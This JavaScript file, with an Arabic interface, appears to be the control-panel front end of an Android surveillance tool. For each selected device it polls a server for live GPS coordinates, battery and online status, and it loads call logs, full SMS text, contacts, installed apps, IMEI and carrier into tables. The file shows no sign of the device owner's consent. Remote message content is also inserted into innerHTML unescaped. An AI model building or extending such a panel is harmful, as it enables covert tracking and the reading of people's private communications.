let currentDevice = null;
let updateInterval = null;

// تحميل الأجهزة
async function loadDevices() {
    try {
        const response = await fetch('/devices.json');
        const devices = await response.json();
        
        const select = document.getElementById('deviceSelect');
        select.innerHTML = '<option value="">اختر الجهاز...</option>';
        
        devices.forEach(device => {
            const option = document.createElement('option');
            option.value = device.id;
            option.textContent = device.id;
            select.appendChild(option);
        });
    } catch (e) {
        console.error('Devices error:', e);
    }
}

function selectDevice(deviceId) {
    currentDevice = deviceId;
    if (updateInterval) clearInterval(updateInterval);
    if (deviceId) {
        updateInterval = setInterval(updateLiveData, 3000);
        updateLiveData();
        loadAllData();
    }
}

async function updateLiveData() {
    if (!currentDevice) return;
    
    try {
        const response = await fetch(`/live.php?device=${currentDevice}`);
        const data = await response.json();
        
        const statusEl = document.getElementById('networkStatus');
        if (data.online) {
            statusEl.textContent = data.network || 'متصل';
            statusEl.className = 'value online';
        } else {
            statusEl.textContent = 'غير متصل';
            statusEl.className = 'value offline';
        }
        
        if (data.location && data.location.latitude) {
            document.getElementById('locationStatus').textContent = 
                `${data.location.latitude.toFixed(4)}, ${data.location.longitude.toFixed(4)}`;
            document.getElementById('locationStatus').className = 'value online';
        }
        
        if (data.battery !== null && data.battery !== undefined) {
            document.getElementById('batteryStatus').textContent = data.battery + '%';
        }
        
        if (data.seconds_ago !== undefined) {
            const lastSeen = document.getElementById('lastSeen');
            if (data.seconds_ago < 10) lastSeen.textContent = 'الآن';
            else if (data.seconds_ago < 60) lastSeen.textContent = `${data.seconds_ago} ثانية`;
            else lastSeen.textContent = `${Math.floor(data.seconds_ago / 60)} دقيقة`;
        }
        
        if (data.call_count !== undefined) 
            document.getElementById('callCount').textContent = `(${data.call_count})`;
        if (data.sms_count !== undefined) 
            document.getElementById('smsCount').textContent = `(${data.sms_count})`;
        if (data.contacts_count !== undefined) 
            document.getElementById('contactsCount').textContent = `(${data.contacts_count})`;
        if (data.images_count !== undefined) 
            document.getElementById('imagesCount').textContent = `(${data.images_count})`;
        if (data.apps_count !== undefined) 
            document.getElementById('appsCount').textContent = `(${data.apps_count})`;
        
    } catch (e) {
        console.error('Live error:', e);
    }
}

async function loadAllData() {
    if (!currentDevice) return;
    await loadCalls();
    await loadSMS();
    await loadContacts();
    await loadApps();
    await loadDeviceInfo();
}

async function loadCalls() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=call_logs`);
        const calls = await response.json();
        const tbody = document.getElementById('callsTable');
        tbody.innerHTML = '';
        
        if (!calls || calls.length === 0) {
            tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;">لا توجد مكالمات</td></tr>';
            return;
        }
        
        calls.forEach(call => {
            const row = document.createElement('tr');
            row.innerHTML = `<td>${call.number || ''}</td><td>${formatDuration(call.duration)}</td><td>${getCallType(call.type)}</td><td>${formatDate(call.date)}</td>`;
            tbody.appendChild(row);
        });
    } catch (e) {}
}

async function loadSMS() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=sms`);
        const smsList = await response.json();
        const tbody = document.getElementById('smsTable');
        tbody.innerHTML = '';
        
        if (!smsList || smsList.length === 0) {
            tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;">لا توجد رسائل</td></tr>';
            return;
        }
        
        smsList.forEach(sms => {
            const row = document.createElement('tr');
            row.innerHTML = `<td>${sms.address || ''}</td><td>${sms.body || ''}</td><td>${formatDate(sms.date)}</td><td>${sms.type == 1 ? 'وارد' : 'صادر'}</td>`;
            tbody.appendChild(row);
        });
    } catch (e) {}
}

async function loadContacts() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=contacts`);
        const contacts = await response.json();
        const tbody = document.getElementById('contactsTable');
        tbody.innerHTML = '';
        
        if (!contacts || contacts.length === 0) {
            tbody.innerHTML = '<tr><td colspan="2" style="text-align:center;">لا توجد جهات</td></tr>';
            return;
        }
        
        contacts.forEach(contact => {
            const row = document.createElement('tr');
            row.innerHTML = `<td>${contact.name || ''}</td><td>${Array.isArray(contact.numbers) ? contact.numbers.join(', ') : ''}</td>`;
            tbody.appendChild(row);
        });
    } catch (e) {}
}

async function loadApps() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=installed_apps`);
        const apps = await response.json();
        const tbody = document.getElementById('appsTable');
        tbody.innerHTML = '';
        
        if (!apps || apps.length === 0) {
            tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;">لا توجد تطبيقات</td></tr>';
            return;
        }
        
        apps.forEach(app => {
            const row = document.createElement('tr');
            row.innerHTML = `<td>${app.name || ''}</td><td>${app.package || ''}</td><td>${app.system_app ? 'نعم' : 'لا'}</td>`;
            tbody.appendChild(row);
        });
    } catch (e) {}
}

async function loadDeviceInfo() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=device_info`);
        const info = await response.json();
        const div = document.getElementById('deviceInfo');
        
        if (!info || Object.keys(info).length === 0) {
            div.innerHTML = '<p>لا توجد معلومات</p>';
            return;
        }
        
        div.innerHTML = `
            <table>
                <tr><td>الموديل:</td><td>${info.model || ''}</td></tr>
                <tr><td>العلامة:</td><td>${info.brand || ''}</td></tr>
                <tr><td>النظام:</td><td>${info.os_version || ''}</td></tr>
                <tr><td>IMEI:</td><td>${info.imei || ''}</td></tr>
                <tr><td>الناقل:</td><td>${info.carrier || ''}</td></tr>
            </table>
        `;
    } catch (e) {}
}

function switchTab(tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
    document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`).classList.add('active');
    document.getElementById(`${tabName}Tab`).classList.add('active');
}

function formatDuration(seconds) {
    if (!seconds) return '0:00';
    return `${Math.floor(seconds / 60)}:${(seconds % 60).toString().padStart(2, '0')}`;
}

function formatDate(timestamp) {
    if (!timestamp) return '—';
    return new Date(timestamp).toLocaleString('ar');
}

function getCallType(type) {
    switch(parseInt(type)) {
        case 1: return '📥 وارد';
        case 2: return '📤 صادر';
        case 3: return '❌ فائت';
        default: return 'غير معروف';
    }
}

// تحميل الأجهزة عند الفتح
loadDevices();
setInterval(loadDevices, 10000);